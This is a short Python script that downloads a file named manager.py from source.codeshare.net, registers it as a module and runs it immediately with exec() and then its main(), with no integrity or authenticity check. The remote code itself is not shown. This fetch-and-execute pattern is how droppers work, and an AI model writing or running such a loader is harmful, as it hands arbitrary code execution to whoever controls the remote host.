import sys
import types
import httplib2

def get_url():
    return "https://source.codeshare.net/resources/manager.py"

def get_source_code(url):
    http_obj = httplib2.Http()
    response, content = http_obj.request(url)
    return content.decode('utf-8')

def execute():
    url = get_url()
    module_name = "manager"

    source = get_source_code(url)
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
